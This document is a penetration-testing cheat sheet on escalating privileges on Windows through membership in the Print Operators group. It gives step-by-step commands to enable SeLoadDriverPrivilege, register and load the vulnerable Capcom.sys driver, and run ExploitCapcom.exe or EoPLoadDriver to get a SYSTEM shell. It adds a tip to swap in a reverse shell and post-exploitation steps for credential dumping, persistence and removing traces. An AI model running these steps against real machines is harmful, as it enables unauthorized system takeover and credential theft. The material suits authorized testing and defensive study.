### Technique Name:

Print Operators
### Summary:

Members of the `Print Operators` group are granted powerful privileges including `SeLoadDriverPrivilege`, the ability to manage printers on Domain Controllers, log on locally, and shut down the system. This group can be abused to load vulnerable drivers like `Capcom.sys` to achieve privilege escalation to SYSTEM. This method depends on enabling the load driver privilege and loading a malicious driver either directly or via automation tools like `EoPLoadDriver`.
### Conditions:

- Membership in the `Print Operators` group    
- Ability to bypass UAC if SeLoadDriverPrivilege is not listed
- Ability to compile or run pre-compiled driver loading tools and exploits
- Vulnerable driver available (e.g., Capcom.sys)
- OS version before Windows 10 v1803 (for HKCU registry loading technique)
### Enumeration:

```cmd
whoami /priv
net localgroup "Print Operators"
```

To verify the presence of `SeLoadDriverPrivilege`:

```cmd
# From unelevated shell
whoami /priv

# From elevated shell (post-UAC bypass or GUI prompt)
whoami /priv
```
### Exploitation:
#### 1. Compile and Run Privilege Enabler

```bash
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
EnableSeLoadDriverPrivilege.exe
```
#### 2. Add Registry Key to Load Driver

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
#### 3. Load and Exploit Driver

```cmd
# Run EnableSeLoadDriverPrivilege.exe to enable the necessary privilege
# Then run compiled ExploitCapcom.exe
ExploitCapcom.exe
```

> If GUI access is not available, modify the `LaunchShell()` function in the exploit to launch a reverse shell instead of `cmd.exe`.
#### Alternate (Automated): Use EoPLoadDriver

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
ExploitCapcom.exe
```
### Post-Exploitation:

- Confirm SYSTEM shell via `whoami`    
- Enumerate and dump credentials or establish persistence
- Remove registry artifacts:

```cmd
reg delete HKCU\System\CurrentControlSet\Capcom /f
```

- Optionally delete dropped driver and executable files
- Inform client that `SeLoadDriverPrivilege` abuse via HKCU is mitigated in Windows 10 1803 and later
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Privileged_Groups 